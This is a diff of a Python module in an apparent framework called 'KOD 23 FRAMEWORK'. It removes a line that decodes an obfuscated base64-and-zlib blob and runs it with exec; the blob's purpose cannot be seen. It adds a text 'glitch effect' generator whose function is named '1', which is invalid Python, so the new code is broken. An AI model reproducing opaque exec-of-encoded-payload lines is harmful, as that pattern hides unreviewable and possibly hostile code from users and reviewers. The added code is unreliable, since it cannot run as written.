@@ -1,2 +1,104 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+OPTIONS = {
+    'default': {
+        'intensity': 0.7,
+        'iterations': 5,
+        'seed_text': 'KOD 23 FRAMEWORK',
+        'distortion': 2
+    },
+    'description': {
+        'intensity': 'Glitch distortion intensity (0.1-1.0)',
+        'iterations': 'Number of glitch pass iterations',
+        'seed_text': 'Base text to apply glitch effect',
+        'distortion': 'Character distortion multiplier'
+    }
+}
+
+import random
+import time
+import string
+import sys
+
+def 1(options=None):
+    output = []
+    try:
+        opts = OPTIONS['default'].copy()
+        if options:
+            opts.update({k: v for k, v in options.items() if k in opts})
+
+        intensity = max(0.1, min(1.0, opts['intensity']))
+        iterations = max(1, int(opts['iterations']))
+        seed = str(opts['seed_text'])
+        distortion = max(1, int(opts['distortion']))
+
+        output.append('[*] Initializing Glitch Matrix...')
+        time.sleep(0.08)
+
+        glitch_chars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`'
+        base_chars = string.ascii_letters + string.digits + ' '
+
+        processed = []
+        for i in range(iterations):
+            progress = (i + 1) / iterations
+            bars = int(progress * 30)
+            output.append(f'[*] Glitch Pass {i+1}/{iterations} [{"█" * bars}{"░" * (30 - bars)}]')
+
+            current = list(seed)
+            for j in range(len(current)):
+                if random.random() < intensity * 0.6:
+                    if random.random() < 0.3:
+                        current[j] = random.choice(glitch_chars)
+                    elif random.random() < 0.4:
+                        offset = random.randint(-distortion, distortion)
+                        src_idx = max(0, min(len(current)-1, j + offset))
+                        current[j] = current[src_idx]
+                    else:
+                        current[j] = random.choice(base_chars)
+
+                if random.random() < intensity * 0.15:
+                    if j < len(current) - 1:
+                        current[j], current[j+1] = current[j+1], current[j]
+
+            if random.random() < intensity * 0.2:
+                insert_pos = random.randint(0, len(current))
+                current.insert(insert_pos, random.choice(glitch_chars))
+                if len(current) > len(seed) * 3:
+                    current.pop(random.randint(0, len(current)-1))
+
+            processed.append(''.join(current))
+            time.sleep(0.05 + random.random() * 0.02)
+
+        output.append('[+] Glitch effect applied successfully')
+        output.append('[*] Generating final artifact...')
+        time.sleep(0.06)
+
+        final_variants = []
+        for idx, variant in enumerate(processed[-3:]):
+            prefix = '▒' * (idx + 1) + '░' * (3 - idx)
+            final_variants.append(f'{prefix} {variant}')
+
+        output.append('[+] Final glitch output:')
+        for line in final_variants:
+            output.append(f'  {line}')
+
+        if len(processed) > 1:
+            combined = []
+            for chars in zip(*[list(v) for v in processed[-2:]]):
+                if random.random() < 0.3:
+                    combined.append(random.choice(glitch_chars))
+                else:
+                    combined.append(chars[0] if random.random() < 0.7 else chars[1])
+            output.append(f'  ✦ {''.join(combined)}')
+
+        output.append('[+] Glitch Artifact Complete')
+        output.append(f'[*] Processed {len(processed)} frames with {sum(1 for c in seed if c.isalpha())} characters')
+
+    except Exception as e:
+        output.append(f'[!] Critical glitch failure: {str(e)}')
+        output.append('[*] Rolling back to base seed...')
+        output.append(f'[+] {seed}')
+
+    output.append('[*] Glitch sequence terminated')
+    return '\n'.join(output)
+
+def run(options=None):
+    return 1(options)
